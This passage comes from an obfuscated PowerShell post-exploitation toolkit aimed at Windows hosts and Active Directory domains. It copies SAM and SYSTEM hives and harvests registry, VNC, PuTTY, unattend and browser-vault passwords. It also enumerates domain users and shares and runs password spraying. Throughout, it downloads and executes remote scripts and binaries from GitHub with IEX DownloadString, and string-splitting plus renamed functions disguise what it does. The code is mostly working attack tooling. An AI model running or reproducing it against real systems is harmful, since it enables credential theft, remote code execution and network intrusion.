            If ( Test-Path -Path ((  'Re' +  'gistry::' + 'HKEY_L'  + 'OCAL_MACH'  + 'INE'+ 'qB7S' +  'Y'  + 'STEMqB7Cur' + 'ren'  + 'tCon'+ 'trolS' +  'etqB7S' +'er'  +'vicesqB' +  '7SN' + 'MP')."rEPla`ce"((  [cHAR]113 +[cHAR]66+ [cHAR]55  ),[sTRINg][cHAR]92  ))  ){Get-ChildItem -path (  (  'Regis'+ 'try' +  ':' +  ':HKE'+'Y'+ '_L'+  'OCAL_MA'  +  'CHI' + 'NEuEiSY'+  'STE'  +  'M'+'uE' +  'i'  +'C' + 'urr' +  'ent'  +  'Cont' + 'r'  + 'o'  +'lSetuEiServ'  +'ices'  +  'uEi'+'SNMP')."r`EP`laCe"(([CHAR]117 +[CHAR]69  + [CHAR]105),'\'  ) ) -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
            If ( Test-Path -Path %syStEMrooT%\RePAIR\sam){Write-Host -ForegroundColor YELlow ( 'SA' + 'M Fil' +'e rea'  +  'chab'+ 'l'  + 'e, '+  'lo' +  'oki'+  'ng for S' +  'YS?'  );  copy %sYsTEMROot%\rEpAIR\sam "$currentPath\LocalRecon\SAM"}
            If (Test-Path -Path %SYSTemroOt%\sYstem32\coNFig\SaM ){Write-Host -ForegroundColor YELLOW ('SAM File reachab' + 'le,' +  ' ' +'loo' +  'k'+ 'in'+'g '+ 'for SYS'+'?');  copy %SySTEMROot%\syStem32\coNFIg\sAm "$currentPath\LocalRecon\SAM"}
            If ( Test-Path -Path %systEmrOOt%\sYstem32\COnfIG\REGBACk\saM){Write-Host -ForegroundColor yeLLoW (  'SAM'+' File re'+'acha'+ 'ble'  + ', '+ 'lo'  +  'okin'+  'g for' +  ' SY'+'S?'); copy %SySTemrOot%\SysteM32\coNfiG\rEGbaCK\sAM "$currentPath\LocalRecon\SAM"}
            If (  Test-Path -Path %sYsteMrOOT%\SyStEm32\cOnfIg\sam  ){Write-Host -ForegroundColor yelLOW ( 'SA'  + 'M File r'  +  'ea'  + 'c' +  'habl' + 'e, lo'  +'oki'  + 'ng f'  +'or SYS?')  ; copy %SYStEMRoOT%\SYsTem32\conFIg\sAm "$currentPath\LocalRecon\SAM"}
            If ( Test-Path -Path %SYstEMrooT%\rePAIr\SYStEM  ){Write-Host -ForegroundColor yElLoW ( 'SY'  +  'S F' +  'ile rea'+  'chable, ' +'l' +  'o'+'o'+  'king'+ ' for SAM'  + '?'  )  ;copy %sysTeMRoOt%\rEPAIR\sYsTem "$currentPath\LocalRecon\SYS"}
            If (Test-Path -Path %SYsTeMRoOt%\SystEM32\CoNFIg\system ){Write-Host -ForegroundColor YeLLow ('SYS'  +' File r'  +'ea'  +'chable, look'  +  'in'  + 'g for SAM'+ '?'  )  ; copy %SYsTemrooT%\sysTeM32\cONfig\SYStEm "$currentPath\LocalRecon\SYS"}
            If (Test-Path -Path %sYsTEMROOT%\sySTEM32\cOnFIG\Regback\SySTEm ){Write-Host -ForegroundColor yelLow ( 'SYS File ' + 'r'+'each'  +'a'+ 'bl'  + 'e,' +  ' lo'  +  'oking'+' for SAM'  +'?' ) ;copy %sYSTEMROoT%\SYsTeM32\CoNfiG\RegBack\sYStem "$currentPath\LocalRecon\SYS"}

            Write-Host -ForegroundColor yELloW ('Checking'  + ' R'  +'eg' + 'istry f'  +  'or pote' + 'ntial p' +'asswo' +'rds'  )
            REG querY Hklm /f ('pa' +'ss'+  'wor'  ) /T REG_Sz /s /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
            REG query hKcU /F (  'pa'  +'sswor' + 'd'  ) /T rEg_Sz /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"

            Write-Host -ForegroundColor yElLOw ( 'C' +'hec'+'king sensitive'+  ' r'+ 'egi'+ 'stry'+' ent'  +  'ries.'  + '.' )
            If ( Test-Path -Path ( ('Reg'  + 'istry::HKEY'+ '_LOCAL_MACHINEwUlSOFTWAR'+ 'Ew' +'UlMi' +'c' +  'rosof' + 'twU'  + 'lWindo' +'ws'+ ' '+  'NT'  +  'w' +'U'  + 'lCurrentVersionwUl'  + 'Winl' +'o' +'g' + 'o'+  'n'  )."R`ep`Lace"( 'wUl',[StRiNG][CHar]92)  )  )
	        {
	    	    reg QUErY (  ( 'H'+  'KLMM'  +  '97SOFTWARE'  +'M97Mic' + 'r'  + 'osoft'  +'M97'+ 'Windows '  +  'NTM97Currentve'+ 'rsionM97Winlo' +  'gon'  )."r`ePL`ACe"( 'M97','\'  )) >> "$currentPath\LocalRecon\Winlogon.txt"
	        }
            If ( Test-Path -Path (( 'R'+  'egi'+ 'st' + 'r'+ 'y::HKE'  +'Y_L' +  'OCAL_' +  'MA'+ 'CH'  +'INE{'+  '0}'  +'S' + 'Y'+'S' +  'TE' + 'M{0}Curren'  +  't{0'  +  '}Co' +  'ntrolSet'  +  '{' + '0}Serv'+  'ic' + 'es{0}SNMP'  )  -F[chAr]92 )  ){reg querY ((  'HKLMx61'+ 'SY' +  'STE'  +  'Mx'+  '61Curre'  + 'ntx61Con'  +  't'+'rolS'  + 'etx61'  +  'Se'+'r' +  'vic'+ 'e'  +  's'  +  'x61SNMP')."Repl`ACe"((  [ChaR]120+[ChaR]54 +[ChaR]49 ),'\')) >> "$currentPath\LocalRecon\SNMPParameters.txt"}
            If ( Test-Path -Path (('R'  +  'egi'  +  'stry::' +'HK'+  'E' + 'Y'  + '_LO'+ 'CAL' +'_M'+  'ACHI'  +  'NE5BTSOFTW' +  'A'+  'RE5B'+'TS' +'of' +'t' +  'ware5BTSimonTatham5B'+'T'+'Pu'  +  'T' +  'TY5BTSes'+ 's'+  'ion'+ 's')."repL`A`Ce"( '5BT','\' ))  ){reg qUERY (  ( 'HKCUPNb' +'Sof'  +  'twa'  + 'r'  +'e'  + 'P' +  'N'  +'b' +  'S'+  'imonTathamP' +'NbPu'  + 'TTYP'  +'Nb' + 'Sessions' )-cREplAcE  ( [CHAR]80+[CHAR]78+ [CHAR]98  ),[CHAR]92 ) >> "$currentPath\LocalRecon\PuttySessions.txt"}
            If (Test-Path -Path ( ( 'Regis'  +'tr'  +  'y::H'+'KE'  + 'Y'  +'_CURRENT_USERn'  +  '8f' + 'Soft'+'wa'+'r'+  'en8fOR'  +  'Ln8f'  + 'WinVN' +  'C3'+  'n'  +'8f'+ 'P'  +'a'+ 'ssword'  )."re`p`lacE"('n8f','\' ) )  ){reg qUERy (( 'H'+  'KCUsqm'  +  'Soft'+ 'w'  +'a'+  're' +'s'  + 'qmO'  +'RLsqmWinVNC3' + 's' + 'qmP'  + 'assw' +'ord'  )."R`ePLace"(  'sqm','\' )) >> "$currentPath\LocalRecon\VNCPassword.txt"}
            If (Test-Path -Path ( (  'Regi'  +  's'  +'tr' +  'y::HKEY_LO'  + 'CA' +  'L_M' +'ACH'+'IN' +  'E{0}SOFTWARE{'+ '0}R'+'eal' + 'VNC{' +  '0}'+  'WinVNC4'  )  -F [ChaR]92)  ){reg Query HKEy_LocAL_MAChInE\sOftWare\rEaLvNC\wInvnc4 /V PaSsworD >> "$currentPath\LocalRecon\RealVNCPassword.txt"}

            If (Test-Path -Path c:\unaTTeNd.xml  ){copy C:\unAtTenD.xml "$currentPath\LocalRecon\unattended.xml"  ; Write-Host -ForegroundColor YElLow (  'Una'+ 'ttende'+'d.xml Foun'  + 'd, c'  +  'heck it fo'  + 'r'  + ' pas' +'swor'  +  'ds' )}
            If (  Test-Path -Path c:\WINDowS\panther\unAttend.XmL ){copy C:\wINdOws\panTher\unATteND.XMl "$currentPath\LocalRecon\unattended.xml";  Write-Host -ForegroundColor YeLlOw (  'Una'+  'tte'  +  'nde'+ 'd.x'  +'ml'  +' Foun' + 'd, check it for pa'+  'ssw'  + 'ord'+  's'  )}
            If (  Test-Path -Path c:\wInDows\panTHER\UNAttENd\unattEnD.XMl  ){copy c:\wiNDOWs\panther\UnATteND\uNATtend.XMl "$currentPath\LocalRecon\unattended.xml" ; Write-Host -ForegroundColor yelloW (  'Unat'+'tended.xml F'+'ound, ch' +  'ec'  +'k i'  +  't for p'+'asswor' +  'ds' )}
            If (  Test-Path -Path C:\WInDows\sYStEM32\SyspREP.inf ){copy c:\WiNDoWs\SyStEM32\sysPReP.InF "$currentPath\LocalRecon\sysprep.inf" ;   Write-Host -ForegroundColor yELLow (  'S'+  'y'+  'sprep.i'+  'nf Fo'  + 'und, c'  +'hec'+'k i'  + 't fo'+  'r '+ 'p'+  'as'+'swords')}
            If (  Test-Path -Path c:\winDOwS\sysTem32\SYSPrEP\SYSpREp.XmL){copy c:\WiNdOWS\SysteM32\sysPREP\SyspreP.Xml "$currentPath\LocalRecon\sysprep.inf";  Write-Host -ForegroundColor YellOW ('Sysprep.i'  + 'nf Fo'+'und' + ', '+'c'  +  'heck' + ' i'  +  't for pa'  +'ss'  +  'words')}

            Get-Childitem -Path c:\IneTpuB\ -Include WeB.cOnfiG -File -Recurse -ErrorAction sIlenTlYcOnTiNUe >> "$currentPath\LocalRecon\webconfigfiles.txt"

            Get-WmiObject -Query ( 'Sel'+ 'e'+  'ct * fr'  +'om ' +  'Win32_' +  'Pro' +  'cess' )  |  where {${_}."N`Ame" -notlike (  's'  +'vchost' +'*')}  | Select NAMe, HAnDLe, @{"La`Bel"  = (  'Ow'  + 'ner' );  "ExPr`Es`siOn" = {${_}."gET`owNER"(  )."US`Er"}} |   ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"

            Write-Host -ForegroundColor YeLLOW ( 'Che'+'cking f'  + 'o'+  'r ' +'u'+'sabl'+  'e ' + 'crede'  + 'ntials (cm' +'dkey '+'/'+  'list)'  )
            cmdkey /LiST >> "$currentPath\LocalRecon\SavedCredentials.txt" 



            ${doT`NEt}  =  Read-Host -Prompt ( 'Do y' +'ou wan' +  't to se'+  'arch for ' +'.N'+'ET Bina'+  'rie'  + 's o'+ 'n th'+  'is sys' + 't' + 'em?'+  ' (thee'+  'se ' +'c'+'an be easily reverse engi'+'neered for vulnera' +  'bility'  + ' ana'+'lysis)'+' '  +'(' +'yes/n'  +'o)' )
            if ( ${d`otnEt} -eq (  'y'  + 'es'  ) -or ${Do`Tn`et} -eq "y" -or ${dO`TN`eT} -eq ('Ye'  +  's') -or ${d`OTn`et} -eq "Y")
            {
                Write-Host -ForegroundColor YeLLoW ('Se'  +'ar' +  'c' +'hing for Files - Output is sa'  +  'v'  +  'ed t'  +  'o th'  +  'e l' +'ocalreco' + 'n f'  +'ol'  + 'der:')
                iex (new-object Net.WEBclient)."dOwNlo`ADS`Tring"(  ( 'h' +  'ttps://' +  'r' +'a'  +  'w.g' + 'ithub'  + 'usercon' + 'te' + 'nt.co' + 'm/'  +'SecureTh'  + 'isShit'+ '/Creds/m' + 'as'  +  'te'+'r' + '/Ge' +'t-D'  +  'o'  +  'tN'  + 'etServ'+'i'+'ces.'+  'p' +'s1') )
                Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
            }

            if ( isadmin )
            {
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1'');Invoke-HostEnum >> .\LocalRecon\HostEnum.txt}'
                 ${ps`RECOn}   =  Read-Host -Prompt ( 'Do' +' you '  +'w'  +'ant to gath' + 'er local computer Informa'  +'tion' +'s wit'+  'h PSRe'  +  'con? (yes'+  '/'  +  'n'+'o)' )
                if (${PsR`ec`on} -eq ( 'y' + 'es' ) -or ${pSR`econ} -eq "y" -or ${P`sRecOn} -eq ('Y'  + 'es') -or ${psre`COn} -eq "Y")
                {
                    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                }
                Write-Host -ForegroundColor YEllOw ( ('Saving general co' +  'm'  +  'p' +'ut'+ 'er'  +  ' informa'  +'tion' +  ' t' +  'o .' +'N' +'1PL' +'oc' + 'alReconN1PC'+ 'ompu' + 'ter' +'d'+ 'etails.t' + 'x' +  't:')."repla`CE"('N1P','\'  ))
                Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"

                Write-Host -ForegroundColor YelloW (  'Starting ' + 'W' + 'INS'  +  'p'+ 'e' + 'ct:'  )
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
            }

         
            ${s`e`Ssion}  = Read-Host -Prompt (  'Do '+ 'you wan'  + 't to'+  ' ' +  'st' +'ar'+  't Session'  +  'G' +'opher '+  'module' +'? (yes/no)' )
            if (${Se`ssI`ON} -eq ('ye'  +'s') -or ${Se`ssI`oN} -eq "y" -or ${s`eSsI`On} -eq ('Ye' +'s' ) -or ${s`ess`iON} -eq "Y"  )
            {
                sessionGopher
            }

            ${S`EarCH}  = Read-Host -Prompt ('Do ' +'you w' + 'an'+  't' +' to s' +  'e' +'arch '  +'fo'+  'r s' + 'e' +'nsitiv' +'e' +  ' file'+  's on'  +' this loca' +'l'  + ' sys' +  't'  + 'em'+  '? (c'+  'onf'+  'ig file' + 's,' + ' rd' +'p f' + 'iles'  +', passwo'+ 'rd files an'  +'d mor'  +'e) (y'+  'es/n'  + 'o'  +') - takes' + ' a lot '  +'o'  +  'f tim'  + 'e' )
            if (${S`EARch} -eq (  'y'+'es' ) -or ${SE`A`RCh} -eq "y" -or ${s`E`ARcH} -eq ('Y' +  'es') -or ${SEa`Rch} -eq "Y")
            {
                IEX (New-Object NEt.WebCLIent)."DoW`NLOadSTRI`NG"( ( 'h'+ 'tt' + 'p'  +'s://r' + 'aw.githubu'+ 'sercon'  + 'tent.com/Se'+ 'cureThisShit/'  +'Cred' + 's/m'+'aste' +'r/ob'  + 'fu'  +  'scatedps/find'+ '-'+'interes' + 'ting.p'  +'s' +'1'  )  )
                Write-Host -ForegroundColor YeLlOw ('Lookin'  +'g ' +  'for in' +  'ter'  +  'esting f'  +'iles' +':'  )
                Find-InterestingFile -Path (( 'C:'+'{'+'0}' )  -F  [char]92 ) -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
                Find-InterestingFile -Path (  ('C:ofI' )."Repl`Ace"( ( [CHAr]111  +  [CHAr]102 +[CHAr]73),[stRIng][CHAr]92  )) -Terms pASS,loGIN,RDp,kdbx,bACKuP -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
            }

            ${Se`ArcH}  = Read-Host -Prompt ( 'Start '+ 'Jus'  +'t Anothe' + 'r Wi'+'ndo' + 'ws' +' ' +'(' +'Enum) Scr'+ 'ipt'  +  '?'+ ' ('+  'yes/no'+ ')')
            if ( ${s`eARcH} -eq ( 'ye'+ 's'  ) -or ${se`ArCH} -eq "y" -or ${se`ARCh} -eq (  'Ye'  + 's' ) -or ${Se`ARCH} -eq "Y"  )
            {
                jaws
            }
            
            ${Ch`R`omE}  = Read-Host -Prompt ('Dum' +'p Ch'+'ro'+  'me'  +' Browser hi' +  'st'+'ory'  +' and m'+  'ay'  +  'be'  + ' ' +  'passwords?' +  ' (' +'ye' +  's/'  +  'no)'  )
            if ( ${Ch`R`OME} -eq (  'ye'+ 's'  ) -or ${c`hRoME} -eq "y" -or ${cHR`OMe} -eq ( 'Ye'+  's' ) -or ${chRO`Me} -eq "Y" )
            {
                iex (new-object Net.wEBclient  )."dOW`N`LOADST`RING"(('https'  + '://raw.gith'  + 'ubus'+ 'ercontent' +'.com/Se'+ 'c'+'ureThis'  +'S' +'hit/Creds/'  + 'master/Get'+'-'  +'Chro'+  'me'  +  'Dump'+'.ps1'  ) )
                Install-SqlLiteAssembly
                Get-ChromeDump >> "$currentPath\LocalRecon\Chrome_Credentials.txt"
                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                Write-Host -ForegroundColor YElLOw (  'Do'+'ne, loo'+  'k i' +  'n' + ' the'  +' l' +'o'+ 'calreco'+  'n'+  ' fol'  + 'de' +  'r for cred' + 's/hi'+'stor'+  'y:' )
            }
	    
            ${I`E}   = Read-Host -Prompt (  'D'+'ump IE / Edg'+  'e'  +' Bro'  +  'ws' +'e'  +'r passwords? (' +'yes/'+ 'n'  + 'o)'  )
            if (${iE} -eq ( 'ye'  + 's') -or ${i`e} -eq "y" -or ${i`e} -eq (  'Y' +  'es') -or ${i`e} -eq "Y"  )
            {
	    	[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
	    	${v`AULt}  =   New-Object windoWS.SeCuRiTY.cREDEntiALs.PasswOrDvAult 
	    	${v`Ault}."reTRie`VE`ALL"()  |   % { ${_}."re`T`RieVE`pAssW`ORD"(  ) ;  ${_} } >> "$currentPath\LocalRecon\InternetExplorer_Credentials.txt"
	    }
}

function PASshuNt
{

    
    Param
    ( 
        [bool]
        ${loc`Al},

        [bool]
        ${DoM`A`In}
      )
    pathcheck
    ${cURre`N`TpA`TH} =   (  Get-Item -Path (  ('.{0'+  '}' )  -F [char]92  ) -Verbose )."FuL`ln`Ame"
    IEX (  New-Object NEt.WEbClIEnt )."D`O`w`NloADSTRi`Ng"( ( 'h' +  'ttps://ra'+'w.g'  +'i' +'thub'  +'usercont'+  'en'  +'t.c'+ 'om/'+  'SecureThisShit/C'+  'reds/master/obfus' +'c' + 'ated'  +'ps/viewd'  +  'e' + 'vobfs.'  + 'ps1' )  )

        if (  ${DO`MaIn}  )
        {
            Write-Host -ForegroundColor YEllOW ('Co'  + 'll'+ 'ecting acti'  + 've' + ' Wi'+'ndow' +'s Servers' +' from the doma'  +'in...'  )
            ${ACTI`VeS`E`RvErS}   =  Get-DomainComputer -Ping -OperatingSystem ( 'Win' + 'do'+ 'ws Serve' +  'r*')
            ${ACTi`V`E`serVE`Rs}."DN`shO`sTName" >> "$currentPath\DomainRecon\activeservers.txt"

            IEX (New-Object Net.webclIent  )."do`wn`lOAdsT`RiNg"( ('ht'  +  'tps:/'  + '/ra'+'w.githubuse'+ 'r'+ 'c'+  'ontent.com'  +'/SecureThisShit/C'+  're'  +  'ds/master'+ '/ob'+ 'fusc'+'at' +  'ed' + 'ps/viewobfs.ps1'))
            Write-Host -ForegroundColor YELLOw ( 'Sear'+  'ch' +'in'+'g fo'+ 'r S'  + 'ha' +'re'+'s'  +' on th'  +  'e f' + 'ound'  +' Windows '+'Ser'  +'ver' + 's..' + '.')
            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess  |   Out-File -Encoding asCIi "$currentPath\DomainRecon\found_shares.txt"
             
            ${ShA`R`eS}  =   Get-Content "$currentPath\DomainRecon\found_shares.txt"
            ${testS`h`A`ReS}  =  foreach (${L`iNe} in ${S`H`ARes}  ){ echo ( ${l`Ine} )."sP`Lit"(' ')[0]}

            Write-Host -ForegroundColor YElLOW ( 'Starting'+ ' Passhunt.' +  'exe'  +' for all foun' +  'd sh'+'are'+'s'  +  '.')
            if ( test-path $CuRRentPaTH\paSsHUnT.eXE)
            {
                foreach (  ${lI`Ne} in ${TEST`S`ha`REs} )
                {
                    cmd /c sTARt powErShELl -Command ("$currentPath\passhunt.exe " +  '-s' + ' '+  "$line" )
                }
            }
            else
            {
                  (  ls  VAriaBle:bntk9 ).VaLuE::"s`E`CUrITYPRo`T`ocol"  =   (  GET-VARiable  (  '1T6' +  'X'  )  ).VALuE::"Tl`s12"
                Invoke-WebRequest -Uri ( 'https://github.com/Sec' +'ur'+ 'e' +  'ThisShit'+'/Cre'  + 'ds/ra'+ 'w'  +  '/master/pas' +  's' +'hunt'  +'.ex'+'e') -Outfile $cURreNtpaTH\PassHUNT.EXE
                foreach (  ${LI`Ne} in ${S`HA`REs} )
                {
                    cmd /c sTARt pOwErShELl -Command ( "$currentPath\passhunt.exe "  + '-'+ 's '  +  "$line")
                } 
                                    
            }
        }
        if ( ${l`ocAL} )
        {
             $BntK9::"seCurit`yprOt`oc`OL" =    (    gCI varIaBlE:1t6x  ).vAluE::"t`ls12"
            Invoke-WebRequest -Uri ( 'ht'+  'tp'+'s://'  +  'githu'  +  'b.com/S'  +'e'+ 'c'+'ureTh'  +  'isShi'+  't/' + 'Creds/raw'  + '/'+  'mast'+'er/passhu'  +  'nt.exe'  ) -Outfile $cuRreNtpath\PaSshUNt.EXE
            
            cmd /C STaRT pOweRsHeLL -Command "$currentPath\passhunt.exe"
            ${sha`R`EPaSS`HuNT}  =  Read-Host -Prompt ('Do'  + ' you '+'a'+  'l'+  'so ' +  'want ' +'t'+  'o s' +  'earch for'  +' Passwor' +'ds'+  ' on all co'+'nnected netwo'+ 'rkshare' +  's?')
            if (${SHaRePASSH`U`Nt} -eq (  'ye' +  's'  ) -or ${SHa`REP`ASs`HU`NT} -eq "y" -or ${SHaRE`p`A`ssHu`NT} -eq ( 'Ye' + 's'  ) -or ${SHa`REpAss`HunT} -eq "Y"  )
            {
                get-WmiObject -class Win32_sHaRE  |   ft pAtH >> paSSHuNtSHaREs.TxT
                ${Sh`Ar`Es}   = get-content .\PasshuNTShaRES.TXt | select-object -skip 4    
                foreach (  ${L`iNE} in ${SHA`REs} )
                {
                    cmd /c STaRT pOWErshElL -Command ( "$currentPath\passhunt.exe "+  '-'+  's '+"$line")
                } 
                                  
            }
        }
        else
        {
             ( vaRiable bNTk9  -vAl   )::"SEc`UR`iTy`Pro`ToCol"   =   (    Get-cHIlditeM  ( "v"+ "aRIable:1T6" +"X" ) ).vALUE::"TLS`12"
            Invoke-WebRequest -Uri (  'h' +'ttps://'+'g' +'ithub.com/S' +  'ec'+ 'ureThisShit'  + '/' +  'Creds/raw'  +  '/'  + 'master/passhunt.exe'  ) -Outfile $CUrReNtpATh\pASsHuNt.exe
            cmd /C StArT poWERSHEll -Command "$currentPath\passhunt.exe"
        }

}

function Jaws
{

            
            pathcheck
            ${c`URReNt`PaTh}  =   (Get-Item -Path (( '.{0}')  -F [char]92 ) -Verbose )."f`ULlNamE"
            Write-Host -ForegroundColor yelLow ( 'Ex'+'ec'+'uti'  + 'n' +'g'  + ' '  +  'Just' +  ' A'+ 'nother Win' +'do'  +  'ws' +  ' (Enum'  +  ') Scrip'+'t:')
            Invoke-WebRequest -Uri ('h' +  'tt'  +'p'  +'s://raw.git' + 'hubuser'+  'content.co' +  'm/S' + 'ecureThisShi'+  't/Creds/mast'  + 'er/j'  +'aws-en' + 'um.ps' +'1') -Outfile "$currentPath\LocalPrivesc\JAWS.ps1"
            Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'

}

function dOmAInreCONMoDUlEs
{

            
            ${cu`R`Re`NtpaTh} =  (  Get-Item -Path (  ( '.' +  'l4D'  )  -rePLacE'l4D',[char]92  ) -Verbose )."fUl`LNA`ME"
            pathcheck
            IEX (New-Object neT.WEBClIenT)."DO`wNloadsT`R`iNg"(  ( 'htt' +  'ps' +  '://ra'  +  'w.g'+ 'ithubuser' + 'c'+ 'ont'+  'ent.co'+ 'm/Secur' +'eThi'+  'sSh'  + 'it/'+  'Cred'  + 's'+'/m'  + 'aste'  +  'r'+  '/D'+ 'om'+'ainPasswordSpray.'+'ps1') )
            IEX (New-Object nEt.WebclIENT )."dow`NLO`AdStri`Ng"( ('htt'+ 'p' + 's:' +  '//ra'  +'w'+'.githubuserconten'  + 't'+  '.com' +  '/Se'  +  'cure'  +  'ThisShit/Creds'  +'/master/obf' + 'usc' + 'atedps/v' +  'iew.ps1'))
            ${doM`A`In_NAME}  = skulked
            ${DO`ma`in} =   ${d`OmAIN_nA`mE}."Na`Me"

            Write-Host -ForegroundColor YELlOw (  'Start' +  'ing Domain Recon '  +'ph'+ 'ase'+  ':')

            Write-Host -ForegroundColor yElLOw (  'Cr'  + 'eating Dom'+'a'+  'in'  +  ' '  +'User-Li' + 'st:' )
            Get-DomainUserList -Domain ${dom`Ain_NA`Me}."N`AME" -RemoveDisabled -RemovePotentialLockouts  |   Out-File -Encoding ascII "$currentPath\DomainRecon\userlist.txt"
            
            Write-Host -ForegroundColor YELlOW ( 'S'  + 'ea'  +  'rch'  +'ing fo'  +  'r Exploita'+ 'ble'+  ' Sy'  + 's'+'te'  + 'm'+  's:' )
            inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"

            
            

            
            Write-Host -ForegroundColor YeLLOW ('All'+  ' thos'  + 'e P' + 'owe'+'r'+'V'  + 'iew N'+ 'etwork S'+'kr' + 'i'  +'pts'+' for '+ 'la'  +'t'+'e'  +  'r'  + ' Look' + 'up gettin'+'g e' +'xecut'  +  'ed an'+ 'd s'+  'ave'+ 'd:')
            skulked >> "$currentPath\DomainRecon\NetDomain.txt"
            televisions >> "$currentPath\DomainRecon\NetForest.txt"
            misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
            odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
            Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
            Randal >> "$currentPath\DomainRecon\NetSystems.txt"
	        Get-Printer >> "$currentPath\DomainRecon\localPrinter.txt"
            damsels >> "$currentPath\DomainRecon\NetOU.txt"    
            xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
            ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
            reapportioned >> "$currentPath\DomainRecon\NetGroup.txt" 
            confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
            aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
            marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
            liberation >> "$currentPath\DomainRecon\NetShare.txt" 
            cherubs >> "$currentPath\DomainRecon\NetLoggedon"
            Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
            sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
            ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
            condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
            IEX (New-Object NEt.wEBcLIeNT )."DOW`NlOA`DsTri`Ng"(('https://'+'raw.githubusercon'+ 'te'+ 'n' +'t.'+  'com/Secure'+'ThisS'  + 'hit/Creds' +'/mast' + 'er/obfus'  +'catedps/v'+  'iew'+ 'dev' +'obfs'+  '.ps' +  '1' )  )
            breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
	    IEX(  New-Object nEt.WEBcliENT  )."DOwn`LoADS`T`RINg"(('htt'  +  'ps'+  '://raw.g'  +  'ithubuser' +  'content.'+'c'  + 'o' +'m/Se'+  'c'+'u'  + 'reT' +  'hisShit'  + '/' + 'Creds/master/S' +'PN-S'  +  'c' +'an.p'+'s'  +'1'  )  )
	    Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"
	    
            
            Write-Host -ForegroundColor YelLOW ('Searc'  + 'hing' +  ' for passwor'  + 'ds in a'  + 'cti' +  'v'  +'e dir'  +'ec'+'t'+  'ory '  + 'descr'+  'i'  + 'pti'  +  'on'  +' fie'+ 'ld' + 's'  +  '..')
            
              (    gi  vAriAblE:BNtK9  ).VALue::"SEcurIT`YPr`o`T`oCOl" =     (    Get-VaRIaBLe 1T6x -vALuEO )::"Tls`12"
            
            Invoke-Webrequest -Uri (  'https:'+ '//gith'  +  'ub' +  '.'+'com/'+'Sec' +  'u'  +'re'  +  'Thi' +  'sShit/Cre' +  'd'  +'s/raw/mas'+'ter/M'+'icros'+'oft.Act'  +'iveDi'+  're' +'ct' +'ory'  + '.' +'Manag'  +  'eme'  +  'nt'  +'.d'  + 'l'+'l') -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
            Import-Module .\MicROsOft.acTiVeDIRECTorY.manAgEMenT.dlL
	        iex (  new-object neT.WeBClIEnt)."D`O`WnloaDsT`RI`NG"(  (  'h' + 't'+  'tps://raw.gith' +  'ub'  + 'userco'+ 'ntent.com/Secure' + 'ThisShi'+  't'+  '/C'  + 'r'  +'eds/master/' + 'obfuscate'+ 'd' +'ps/'+'adpas' +  's.ps1'  )  )
            thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"

            Write-Host -ForegroundColor yeLLOw ( 'Se'+  'archi' +'n'  + 'g '  +  'for ' + 'U' +  'sers without'+  ' passwo'+  'rd Change '+  'for a long time' )
	        ${D`AtE} =  (Get-Date)."a`Dd`yEArS"(-1  )."To`FI`LeTI`mE"( )
            prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samAcCOuntNaMe,PwdLASTSeT >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
	        
	        prostituted -LDAPFilter ('(!' + 'userAccou'+ 'ntC'+ 'ont'+ 'rol:1.2.840.'  + '113' +'556.1.' + '4.8' +  '03:=2)') -Properties distIngUiSHEDnAME >> "$currentPath\DomainRecon\Enabled_Users.txt"
            prostituted -UACFilter nOt_aCcouNtdIsAbLE -Properties DistInGUIshEDnAMe >> "$currentPath\DomainRecon\Enabled_Users.txt"
	        
            Write-Host -ForegroundColor YELLow (  'Searching for Un'+  'cons'  + 'train' +'ed de'+  'legatio' +  'n S' +  'y' +  's' +'tems and' + ' User' +  's' )
